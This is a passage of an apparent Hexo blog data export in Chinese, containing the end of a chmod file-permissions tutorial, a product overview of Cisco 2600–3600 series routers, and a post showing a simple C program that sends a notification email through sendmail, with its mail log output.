644 mm.txt<br />$ ls –l<br />即设定文件mm.txt的属性为：<br />-rw-r–r– 1 inin users 1155 Nov 5 11:22 mm.txt<br />文件属主（u）inin 拥有读、写权限<br />与文件属主同组人用户（g） 拥有读权限<br />其他人（o） 拥有读权限<br />例2： $ chmod 750 wch.txt<br />$ ls –l<br />-rwxr-x— 1 inin users 44137 Nov 12 9:22 wchtxt<br />即设定wchtxt这个文件的属性为：<br />文件主本人（u）inin 可读&#x2F;可写&#x2F;可执行权<br />与文件主同组人（g） 可读&#x2F;可执行权<br />其他人（o） 没有任何权限</p>\n"},{"title":"cisco 各系列路由器介绍","date":"2010-03-26T03:43:00.000Z","_content":"<![CDATA[思 科 2600 系列路由器                                                                                                                                                                                                                                                                                        <a name=\"content\"></a> <p><img width=\"150\" height=\"117\" src=\"/images/pic/other_site/www_cisco_2600_1.gif\" alt=\"思科 2600 系列路由器\" />Cisco Systems通过Cisco  2600系列将企业级的通用性、集成和功能扩展到了创建以机构。随着新服务和应用的面市，Cisco  2600系列的模块化体系结构能够提供适应网络技术变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特性。通过将多个独立设备的功能集 成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等应用提供经济有效的解决方案。</p>                                                            关键特性                                                            <ul> <li>通用性/ 投资保护－可以现场更新的模块化接口能够启动数以千计的定制化解决方案，并能够轻而易举地适应未来网络的要求。</li> <li>集成/可 管理性－降低拥有成本，简化远程管理，提供结合CSU/DSU、复用器、调制解调器、语音/数据网关、ISDN  NT1、防火墙、VPN、加密和压缩设备的集成化网络。</li> <li>多服务语 音/数据网络－降低办公室之间的电话/传真费用；通过利用Cisco  IOS软件服务质量（QoS）特性（例如RSVP、WFQ、承诺访问速率[CAR]和随机早期检测[RED]），语音流量可以实现数字化并封装在IP数据 包中，而且能够与数据流量合并。</li> </ul思科 2800 系列路由器                                                                                                                                                                                                                <a name=\"content\"></a> <p><img width=\"200\" height=\"105\" src=\"/images/pic/other_site/www_cisco_2800.jpg\" alt=\"思科 2800                                                系列路由器\" />Cisco  2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供重要的附加值。它可以在大幅度提升插槽 性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p思科 3200 系列路由器                                                                                                                                        <a name=\"content\"></a> <p><img width=\"173\" height=\"147\" src=\"/images/pic/other_site/www_cisco_3200_pic1.gif\" alt=\"思科 3200 系列移动接入路由器\" />这个紧凑的、高性能的接入解决方案能够以适 用于各种交通工具的外型，为国防、公共安全、国土安全和运输市场提供无缝的移动功能和多个无线网络的互操作能力。</p> <p>Cisco  3200移动接入路由器可以在多个处于运动之中的无线电、蜂窝式电话、微型和无线局域网（WLAN）网络之间提供无缝的通信，从而将IP网络拓展到了运动 中网络领域。</p> <p>Cisco  3200移动接入路由器主要适用于运动中的交通工具，并可以在多个网络之间实现无线连接，从而让用户可以在业界标准的IP技术的基础上部署关键任务型应 用。IP网络为在使用各种传输介质的用户之间共享信息和应用提供了一个平台。Cisco  IOS软件添加了功能丰富的服务、管理功能和移动网络功能。Cisco  3200移动接入路由器让用户可以有效地在一个对等的、层次化的或者网格式的IP网络中传输关键任务型语音、视频和数据。用户可以迅速地制定更加准确的决 策，从而提高他们在现场的工作效率。</p> <p>Cisco 3200移动接入路由器可以为用户提供下列优势：</p> <ul> <li>利用独立于位置或者运动状态的无缝移动功能，实现安全的数 据、语音和视频通信。</li> <li>以一个适用于各种交通工具的、紧凑的、坚固的外型，提供很高 的性能。</li> <li>利用Cisco IOS软件提供先进的IP服务和互操作性。</li> </ul> <p>Cisco  3200移动接入路由器（如图1所示）的设计目的是集成到系统集成商所部署的、全面、定制的通信解决方案中。这使得用户可以在各种空中、陆地或者海洋交通 工具（包括用于军事或者公共安全用途的交通工具）中部署通信网络。系统集成商可以提供一个完整的移动解决方案，其中包括Cisco  3200移动接入路由器硬件、Cisco IOS软件、专门定制的布线设计、电源和外壳，以及其他必要的组件。这些组件可能包括Cisco  Aironet WLAN产品、思科安全硬件和软件、思科路由和交换产品，以及Cisco LAN和WAN管理软件。</p>                                                                                                                                                                                                                                                                                                                                                             思科 3600 系列路由器                                                                <a name=\"content\"></a> <p><img width=\"216\" height=\"172\" src=\"/images/pic/other_site/www_cisco_3600_1.gif\" alt=\"思科 3600 系列路由器\" />Cisco  3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口选项，提供语音/数据集成、虚拟专网（VPN）、拨号访问和多协议数据路由解决方案。通过利用CIsco的语音/传真 网络模块，Cisco  3600系列允许客户在单个网络上合并语音、传真和数据流量。高性能的模块化体系结构保护了客户的网络技术投资，并将多个设备的功能集成到一个可管理的解 决方案之中。3600捆绑还可用于抓住特定的RAS机遇。</p>                        关键特性                        <ul> <li>在一个平台中结合了拨号访问、先进的局域网到局域网]]\n>","source":"_posts/cisco-各系列路由器介绍.md","raw":"title: cisco 各系列路由器介绍\ncategories: [网络工程]\ntags: []\ndate: 2010-03-26 11:43:00\n---\n<![CDATA[思 科 2600 系列路由器                                                                                                                                                                                                                                                                                        <a name=\"content\"></a> <p><img width=\"150\" height=\"117\" src=\"/images/pic/other_site/www_cisco_2600_1.gif\" alt=\"思科 2600 系列路由器\" />Cisco Systems通过Cisco  2600系列将企业级的通用性、集成和功能扩展到了创建以机构。随着新服务和应用的面市，Cisco  2600系列的模块化体系结构能够提供适应网络技术变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特性。通过将多个独立设备的功能集 成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等应用提供经济有效的解决方案。</p>                                                            关键特性                                                            <ul> <li>通用性/ 投资保护－可以现场更新的模块化接口能够启动数以千计的定制化解决方案，并能够轻而易举地适应未来网络的要求。</li> <li>集成/可 管理性－降低拥有成本，简化远程管理，提供结合CSU/DSU、复用器、调制解调器、语音/数据网关、ISDN  NT1、防火墙、VPN、加密和压缩设备的集成化网络。</li> <li>多服务语 音/数据网络－降低办公室之间的电话/传真费用；通过利用Cisco  IOS软件服务质量（QoS）特性（例如RSVP、WFQ、承诺访问速率[CAR]和随机早期检测[RED]），语音流量可以实现数字化并封装在IP数据 包中，而且能够与数据流量合并。</li> </ul思科 2800 系列路由器                                                                                                                                                                                                                <a name=\"content\"></a> <p><img width=\"200\" height=\"105\" src=\"/images/pic/other_site/www_cisco_2800.jpg\" alt=\"思科 2800                                                系列路由器\" />Cisco  2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供重要的附加值。它可以在大幅度提升插槽 性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p思科 3200 系列路由器                                                                                                                                        <a name=\"content\"></a> <p><img width=\"173\" height=\"147\" src=\"/images/pic/other_site/www_cisco_3200_pic1.gif\" alt=\"思科 3200 系列移动接入路由器\" />这个紧凑的、高性能的接入解决方案能够以适 用于各种交通工具的外型，为国防、公共安全、国土安全和运输市场提供无缝的移动功能和多个无线网络的互操作能力。</p> <p>Cisco  3200移动接入路由器可以在多个处于运动之中的无线电、蜂窝式电话、微型和无线局域网（WLAN）网络之间提供无缝的通信，从而将IP网络拓展到了运动 中网络领域。</p> <p>Cisco  3200移动接入路由器主要适用于运动中的交通工具，并可以在多个网络之间实现无线连接，从而让用户可以在业界标准的IP技术的基础上部署关键任务型应 用。IP网络为在使用各种传输介质的用户之间共享信息和应用提供了一个平台。Cisco  IOS软件添加了功能丰富的服务、管理功能和移动网络功能。Cisco  3200移动接入路由器让用户可以有效地在一个对等的、层次化的或者网格式的IP网络中传输关键任务型语音、视频和数据。用户可以迅速地制定更加准确的决 策，从而提高他们在现场的工作效率。</p> <p>Cisco 3200移动接入路由器可以为用户提供下列优势：</p> <ul> <li>利用独立于位置或者运动状态的无缝移动功能，实现安全的数 据、语音和视频通信。</li> <li>以一个适用于各种交通工具的、紧凑的、坚固的外型，提供很高 的性能。</li> <li>利用Cisco IOS软件提供先进的IP服务和互操作性。</li> </ul> <p>Cisco  3200移动接入路由器（如图1所示）的设计目的是集成到系统集成商所部署的、全面、定制的通信解决方案中。这使得用户可以在各种空中、陆地或者海洋交通 工具（包括用于军事或者公共安全用途的交通工具）中部署通信网络。系统集成商可以提供一个完整的移动解决方案，其中包括Cisco  3200移动接入路由器硬件、Cisco IOS软件、专门定制的布线设计、电源和外壳，以及其他必要的组件。这些组件可能包括Cisco  Aironet WLAN产品、思科安全硬件和软件、思科路由和交换产品，以及Cisco LAN和WAN管理软件。</p>                                                                                                                                                                                                                                                                                                                                                             思科 3600 系列路由器                                                                <a name=\"content\"></a> <p><img width=\"216\" height=\"172\" src=\"/images/pic/other_site/www_cisco_3600_1.gif\" alt=\"思科 3600 系列路由器\" />Cisco  3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口选项，提供语音/数据集成、虚拟专网（VPN）、拨号访问和多协议数据路由解决方案。通过利用CIsco的语音/传真 网络模块，Cisco  3600系列允许客户在单个网络上合并语音、传真和数据流量。高性能的模块化体系结构保护了客户的网络技术投资，并将多个设备的功能集成到一个可管理的解 决方案之中。3600捆绑还可用于抓住特定的RAS机遇。</p>                        关键特性                        <ul> <li>在一个平台中结合了拨号访问、先进的局域网到局域网]]\n>","slug":"cisco-各系列路由器介绍","published":1,"updated":"2023-04-22T05:38:44.740Z","_id":"clgrjlxb9000k7opi7hsc6g0p","comments":1,"layout":"post","photos":[],"link":"","content":"<![CDATA[思 科 2600 系列路由器                                                                                                                                                                                                                                                                                        <a name=\"content\"></a> <p><img width=\"150\" height=\"117\" src=\"/images/pic/other_site/www_cisco_2600_1.gif\" alt=\"思科 2600 系列路由器\" />Cisco Systems通过Cisco  2600系列将企业级的通用性、集成和功能扩展到了创建以机构。随着新服务和应用的面市，Cisco  2600系列的模块化体系结构能够提供适应网络技术变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特性。通过将多个独立设备的功能集 成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等应用提供经济有效的解决方案。</p>                                                            关键特性                                                            <ul> <li>通用性/ 投资保护－可以现场更新的模块化接口能够启动数以千计的定制化解决方案，并能够轻而易举地适应未来网络的要求。</li> <li>集成/可 管理性－降低拥有成本，简化远程管理，提供结合CSU/DSU、复用器、调制解调器、语音/数据网关、ISDN  NT1、防火墙、VPN、加密和压缩设备的集成化网络。</li> <li>多服务语 音/数据网络－降低办公室之间的电话/传真费用；通过利用Cisco  IOS软件服务质量（QoS）特性（例如RSVP、WFQ、承诺访问速率[CAR]和随机早期检测[RED]），语音流量可以实现数字化并封装在IP数据 包中，而且能够与数据流量合并。</li> </ul思科 2800 系列路由器                                                                                                                                                                                                                <a name=\"content\"></a> <p><img width=\"200\" height=\"105\" src=\"/images/pic/other_site/www_cisco_2800.jpg\" alt=\"思科 2800                                                系列路由器\" />Cisco  2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供重要的附加值。它可以在大幅度提升插槽 性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p思科 3200 系列路由器                                                                                                                                        <a name=\"content\"></a> <p><img width=\"173\" height=\"147\" src=\"/images/pic/other_site/www_cisco_3200_pic1.gif\" alt=\"思科 3200 系列移动接入路由器\" />这个紧凑的、高性能的接入解决方案能够以适 用于各种交通工具的外型，为国防、公共安全、国土安全和运输市场提供无缝的移动功能和多个无线网络的互操作能力。</p> <p>Cisco  3200移动接入路由器可以在多个处于运动之中的无线电、蜂窝式电话、微型和无线局域网（WLAN）网络之间提供无缝的通信，从而将IP网络拓展到了运动 中网络领域。</p> <p>Cisco  3200移动接入路由器主要适用于运动中的交通工具，并可以在多个网络之间实现无线连接，从而让用户可以在业界标准的IP技术的基础上部署关键任务型应 用。IP网络为在使用各种传输介质的用户之间共享信息和应用提供了一个平台。Cisco  IOS软件添加了功能丰富的服务、管理功能和移动网络功能。Cisco  3200移动接入路由器让用户可以有效地在一个对等的、层次化的或者网格式的IP网络中传输关键任务型语音、视频和数据。用户可以迅速地制定更加准确的决 策，从而提高他们在现场的工作效率。</p> <p>Cisco 3200移动接入路由器可以为用户提供下列优势：</p> <ul> <li>利用独立于位置或者运动状态的无缝移动功能，实现安全的数 据、语音和视频通信。</li> <li>以一个适用于各种交通工具的、紧凑的、坚固的外型，提供很高 的性能。</li> <li>利用Cisco IOS软件提供先进的IP服务和互操作性。</li> </ul> <p>Cisco  3200移动接入路由器（如图1所示）的设计目的是集成到系统集成商所部署的、全面、定制的通信解决方案中。这使得用户可以在各种空中、陆地或者海洋交通 工具（包括用于军事或者公共安全用途的交通工具）中部署通信网络。系统集成商可以提供一个完整的移动解决方案，其中包括Cisco  3200移动接入路由器硬件、Cisco IOS软件、专门定制的布线设计、电源和外壳，以及其他必要的组件。这些组件可能包括Cisco  Aironet WLAN产品、思科安全硬件和软件、思科路由和交换产品，以及Cisco LAN和WAN管理软件。</p>                                                                                                                                                                                                                                                                                                                                                             思科 3600 系列路由器                                                                <a name=\"content\"></a> <p><img width=\"216\" height=\"172\" src=\"/images/pic/other_site/www_cisco_3600_1.gif\" alt=\"思科 3600 系列路由器\" />Cisco  3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口选项，提供语音/数据集成、虚拟专网（VPN）、拨号访问和多协议数据路由解决方案。通过利用CIsco的语音/传真 网络模块，Cisco  3600系列允许客户在单个网络上合并语音、传真和数据流量。高性能的模块化体系结构保护了客户的网络技术投资，并将多个设备的功能集成到一个可管理的解 决方案之中。3600捆绑还可用于抓住特定的RAS机遇。</p>                        关键特性                        <ul> <li>在一个平台中结合了拨号访问、先进的局域网到局域网]]\n>","site":{"data":{}},"excerpt":"","more":"<![CDATA[思 科 2600 系列路由器                                                                                                                                                                                                                                                                                        <a name=\"content\"></a> <p><img width=\"150\" height=\"117\" src=\"/images/pic/other_site/www_cisco_2600_1.gif\" alt=\"思科 2600 系列路由器\" />Cisco Systems通过Cisco  2600系列将企业级的通用性、集成和功能扩展到了创建以机构。随着新服务和应用的面市，Cisco  2600系列的模块化体系结构能够提供适应网络技术变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特性。通过将多个独立设备的功能集 成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等应用提供经济有效的解决方案。</p>                                                            关键特性                                                            <ul> <li>通用性/ 投资保护－可以现场更新的模块化接口能够启动数以千计的定制化解决方案，并能够轻而易举地适应未来网络的要求。</li> <li>集成/可 管理性－降低拥有成本，简化远程管理，提供结合CSU/DSU、复用器、调制解调器、语音/数据网关、ISDN  NT1、防火墙、VPN、加密和压缩设备的集成化网络。</li> <li>多服务语 音/数据网络－降低办公室之间的电话/传真费用；通过利用Cisco  IOS软件服务质量（QoS）特性（例如RSVP、WFQ、承诺访问速率[CAR]和随机早期检测[RED]），语音流量可以实现数字化并封装在IP数据 包中，而且能够与数据流量合并。</li> </ul思科 2800 系列路由器                                                                                                                                                                                                                <a name=\"content\"></a> <p><img width=\"200\" height=\"105\" src=\"/images/pic/other_site/www_cisco_2800.jpg\" alt=\"思科 2800                                                系列路由器\" />Cisco  2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供重要的附加值。它可以在大幅度提升插槽 性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p思科 3200 系列路由器                                                                                                                                        <a name=\"content\"></a> <p><img width=\"173\" height=\"147\" src=\"/images/pic/other_site/www_cisco_3200_pic1.gif\" alt=\"思科 3200 系列移动接入路由器\" />这个紧凑的、高性能的接入解决方案能够以适 用于各种交通工具的外型，为国防、公共安全、国土安全和运输市场提供无缝的移动功能和多个无线网络的互操作能力。</p> <p>Cisco  3200移动接入路由器可以在多个处于运动之中的无线电、蜂窝式电话、微型和无线局域网（WLAN）网络之间提供无缝的通信，从而将IP网络拓展到了运动 中网络领域。</p> <p>Cisco  3200移动接入路由器主要适用于运动中的交通工具，并可以在多个网络之间实现无线连接，从而让用户可以在业界标准的IP技术的基础上部署关键任务型应 用。IP网络为在使用各种传输介质的用户之间共享信息和应用提供了一个平台。Cisco  IOS软件添加了功能丰富的服务、管理功能和移动网络功能。Cisco  3200移动接入路由器让用户可以有效地在一个对等的、层次化的或者网格式的IP网络中传输关键任务型语音、视频和数据。用户可以迅速地制定更加准确的决 策，从而提高他们在现场的工作效率。</p> <p>Cisco 3200移动接入路由器可以为用户提供下列优势：</p> <ul> <li>利用独立于位置或者运动状态的无缝移动功能，实现安全的数 据、语音和视频通信。</li> <li>以一个适用于各种交通工具的、紧凑的、坚固的外型，提供很高 的性能。</li> <li>利用Cisco IOS软件提供先进的IP服务和互操作性。</li> </ul> <p>Cisco  3200移动接入路由器（如图1所示）的设计目的是集成到系统集成商所部署的、全面、定制的通信解决方案中。这使得用户可以在各种空中、陆地或者海洋交通 工具（包括用于军事或者公共安全用途的交通工具）中部署通信网络。系统集成商可以提供一个完整的移动解决方案，其中包括Cisco  3200移动接入路由器硬件、Cisco IOS软件、专门定制的布线设计、电源和外壳，以及其他必要的组件。这些组件可能包括Cisco  Aironet WLAN产品、思科安全硬件和软件、思科路由和交换产品，以及Cisco LAN和WAN管理软件。</p>                                                                                                                                                                                                                                                                                                                                                             思科 3600 系列路由器                                                                <a name=\"content\"></a> <p><img width=\"216\" height=\"172\" src=\"/images/pic/other_site/www_cisco_3600_1.gif\" alt=\"思科 3600 系列路由器\" />Cisco  3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口选项，提供语音/数据集成、虚拟专网（VPN）、拨号访问和多协议数据路由解决方案。通过利用CIsco的语音/传真 网络模块，Cisco  3600系列允许客户在单个网络上合并语音、传真和数据流量。高性能的模块化体系结构保护了客户的网络技术投资，并将多个设备的功能集成到一个可管理的解 决方案之中。3600捆绑还可用于抓住特定的RAS机遇。</p>                        关键特性                        <ul> <li>在一个平台中结合了拨号访问、先进的局域网到局域网]]\n>"},{"title":"C Linux下调用sendmail命令发送邮件","date":"2014-03-16T07:51:15.000Z","_content":"用C写了一个扫描类的监控程序，为了监控的实时性，所有要发送邮件。\n前提机器中必须有sendmail程序，sendmail的目录自己定义。\n我测试环境的信息\n<pre>\n[root@localhost sendmail]# uname -a\nLinux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux\n[root@localhost sendmail]# cat /etc/issue\nCentOS release 6.4 (Final)\nKernel r on an m\n</pre>\n代码如下，很简单只要是思路。\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n//借助sendmail命令发送邮件\n//邮件格式如下：\n/*\n*From: John Doe <test@machine.example>\n*Sender: Michael Jones <mjones@machine.example>\n*To: Mary Smith <key1088@163.com>\n*Subject: Saying Hello\n*Date: Fri, 21 Nov 1997 09:55:06 -0600\n*Message-ID: <1234@local.machine.example>\n*\n*This is a message just to say hello.\n*So, \"Hello\".\n*/\nint main(void)\n{\n        FILE    *fp;\n        char    buffer[512];\n        if( (fp=popen(\"/usr/sbin/sendmail -t\",\"w\")) == NULL)\n        {\n                perror(\"open /usr/sbin/sendmail errorn\");\n                printf(\"%sn\", strerror(errno));\n        }\n        fputs(\"From: John Doe <test@machine.example>n\", fp);\n        fputs(\"Sender: Michael Jones <mjones@machine.example>n\", fp);\n        fputs(\"To: key1088 <key1088@163.com>n\", fp);\n        fputs(\"Subject: Hello,wordn\", fp);\n        fputs(\"Date: Fri, 21 Nov 1997 09:55:06 -0600n\", fp);\n        fputs(\"Message-ID: <1234@local.machine.example>n\", fp);\n        fputs(\"n\", fp);\n        fputs(\"This is a message just to say hello.n\", fp);\n        fputs(\"So, Hellon\", fp);\n        if( pclose(fp) != 0) {\n                printf(\"send mail error.n\");\n                exit(1);\n        }\n        printf(\"send mail done.n\");\n}\n[root@localhost sendmail]# cc sendmail.c\n[root@localhost sendmail]# a.out\nsend mail done.\n[root@localhost sendmail]# tail /var/log/maillog\nMar 16 15:43:45 localhost postfix/sendmail[2124]: fatal: Recipient addresses must be specified on the command line or via the -t option\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 2B7F53F87B: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 667E83F89F: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/smtp[2130]: 2B7F53F87B: to=<key1088@163.com>, relay=none, delay=1075, delays=1075/0.08/0/0, dsn=4.4.3, status=deferred (Host or domain name not found. Name service error for name=163.com type=MX: Host not found, try again)\n</pre>\n因为测试环境没有联网，所以是发送不成功。","source":"_posts/C-Linux下调用sendmail命令发送邮件.md","raw":"title: C Linux下调用sendmail命令发送邮件\ncategories: [程序设计,操作系统,C编程]\ntags: []\ndate: 2014-03-16 15:51:15\n---\n用C写了一个扫描类的监控程序，为了监控的实时性，所有要发送邮件。\n前提机器中必须有sendmail程序，sendmail的目录自己定义。\n我测试环境的信息\n<pre>\n[root@localhost sendmail]# uname -a\nLinux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux\n[root@localhost sendmail]# cat /etc/issue\nCentOS release 6.4 (Final)\nKernel r on an m\n</pre>\n代码如下，很简单只要是思路。\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n//借助sendmail命令发送邮件\n//邮件格式如下：\n/*\n*From: John Doe <test@machine.example>\n*Sender: Michael Jones <mjones@machine.example>\n*To: Mary Smith <key1088@163.com>\n*Subject: Saying Hello\n*Date: Fri, 21 Nov 1997 09:55:06 -0600\n*Message-ID: <1234@local.machine.example>\n*\n*This is a message just to say hello.\n*So, \"Hello\".\n*/\nint main(void)\n{\n        FILE    *fp;\n        char    buffer[512];\n        if( (fp=popen(\"/usr/sbin/sendmail -t\",\"w\")) == NULL)\n        {\n                perror(\"open /usr/sbin/sendmail errorn\");\n                printf(\"%sn\", strerror(errno));\n        }\n        fputs(\"From: John Doe <test@machine.example>n\", fp);\n        fputs(\"Sender: Michael Jones <mjones@machine.example>n\", fp);\n        fputs(\"To: key1088 <key1088@163.com>n\", fp);\n        fputs(\"Subject: Hello,wordn\", fp);\n        fputs(\"Date: Fri, 21 Nov 1997 09:55:06 -0600n\", fp);\n        fputs(\"Message-ID: <1234@local.machine.example>n\", fp);\n        fputs(\"n\", fp);\n        fputs(\"This is a message just to say hello.n\", fp);\n        fputs(\"So, Hellon\", fp);\n        if( pclose(fp) != 0) {\n                printf(\"send mail error.n\");\n                exit(1);\n        }\n        printf(\"send mail done.n\");\n}\n[root@localhost sendmail]# cc sendmail.c\n[root@localhost sendmail]# a.out\nsend mail done.\n[root@localhost sendmail]# tail /var/log/maillog\nMar 16 15:43:45 localhost postfix/sendmail[2124]: fatal: Recipient addresses must be specified on the command line or via the -t option\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 2B7F53F87B: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 667E83F89F: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/smtp[2130]: 2B7F53F87B: to=<key1088@163.com>, relay=none, delay=1075, delays=1075/0.08/0/0, dsn=4.4.3, status=deferred (Host or domain name not found. Name service error for name=163.com type=MX: Host not found, try again)\n</pre>\n因为测试环境没有联网，所以是发送不成功。","slug":"C-Linux下调用sendmail命令发送邮件","published":1,"updated":"2023-04-22T05:38:44.615Z","_id":"clgrjlxbc000n7opifg0a4fmp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>用C写了一个扫描类的监控程序，为了监控的实时性，所有要发送邮件。<br>前提机器中必须有sendmail程序，sendmail的目录自己定义。<br>我测试环境的信息</p>\n<pre>\n[root@localhost sendmail]# uname -a\nLinux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux\n[root@localhost sendmail]# cat /etc/issue\nCentOS release 6.4 (Final)\nKernel r on an m\n</pre>\n<p>代码如下，很简单只要是思路。</p>\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n//借助sendmail命令发送邮件\n//邮件格式如下：\n/*\n*From: John Doe <test@machine.example>\n*Sender: Michael Jones <mjones@machine.example>\n*To: Mary Smith <key1088@163.com>\n*Subject: Saying Hello\n*Date: Fri, 21 Nov 1997 09:55:06 -0600\n*Message-ID: <1234@local.machine.example>\n*\n*This is a message just to say hello.\n*So, \"Hello\".\n*/\nint main(void)\n{\n        FILE    *fp;\n        char    buffer[512];\n        if( (fp=popen(\"/usr/sbin/sendmail -t\",\"w\")) == NULL)\n        {\n                perror(\"open /usr/sbin/sendmail errorn\");\n                printf(\"%sn\", strerror(errno));\n        }\n        fputs(\"From: John Doe <test@machine.example>n\", fp);\n        fputs(\"Sender: Michael Jones <mjones@machine.example>n\", fp);\n        fputs(\"To: key1088 <key1088@163.com>n\", fp);\n        fputs(\"Subject: Hello,wordn\", fp);\n        fputs(\"Date: Fri, 21 Nov 1997 09:55:06 -0600n\", fp);\n        fputs(\"Message-ID: <1234@local.machine.example>n\", fp);\n        fputs(\"n\", fp);\n        fputs(\"This is a message just to say hello.n\", fp);\n        fputs(\"So, Hellon\", fp);\n        if( pclose(fp) != 0) {\n                printf(\"send mail error.n\");\n                exit(1);\n        }\n        printf(\"send mail done.n\");\n}\n[root@localhost sendmail]# cc sendmail.c\n[root@localhost sendmail]# a.out\nsend mail done.\n[root@localhost sendmail]# tail /var/log/maillog\nMar 16 15:43:45 localhost postfix/sendmail[2124]: fatal: Recipient addresses must be specified on the command line or via the -t option\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 2B7F53F87B: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/qmgr[1059]: 667E83F89F: from=<root@localhost.localdomain>, size=431, nrcpt=1 (queue active)\nMar 16 15:47:33 localhost postfix/smtp[2130]: 2B7F53F87B: to=<key1088@163.com>, relay=none, delay=1075, delays=1075/0.08/0/0, dsn=4.4.3, status=deferred (Host or domain name not found. Name service error for name=163.com type=MX: Host not found, try again)\n</pre>\n<p>因为测试环境没有联网，所以是发送不成功。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>用C写了一个扫描类的监控程序，为了监控的实时性，所有要发送邮件。<br>前提机器中必须有sendmail程序，sendmail的目录自己定义。<br>我测试环境的信息</p>\n<pre>\n[root@localhost sendmail]# uname -a\nLinux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux\n[root@localhost sendmail]# cat /etc/issue\nCentOS release 6.4 (Final)\nKernel r on an m\n</pre>\n<p>代码如下，很简单只要是思路。</p>\n<pre>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n//借助sendmail命令发送邮件\n//邮件格式如下：\n/*\n*From: John Doe <test@machine.example>\n*Sender: Michael Jones <mjones@machine.example>\n*To: Mary Smith <key1088@163.com>\n*Subject: Saying Hello\n*Date: Fri, 21 Nov 1997 09:55:06 -0600\n*Message-ID: <1234@local.machine.example>\n*\n*This is a message just to say hello.\n*So, \"Hello\".\n*/\nint main(void)\n{\n        FILE    *fp;\n        char    buffer[512];\n        if( (fp=popen(\"/usr/sbin/sendmail -t\",\"w\")) == NULL)\n        {\n                perror(\"open /usr/sbin/sendmail errorn\");\n                printf(\"%sn\", strerror(errno));\n        }\n        fputs(\"From: John Doe <test@machine.example>n\", fp);\n        fputs(\"Sender: Michael Jones <mjones@machine.example>n\", fp);\n        fputs(\"To: key1088 <key1088@163.com>n\", fp);\n        fputs(\"Subject: Hello,wordn\", fp);\n        fputs(\"Date: Fri, 21 Nov 1997 09:55:06 -0600n\", fp);\n        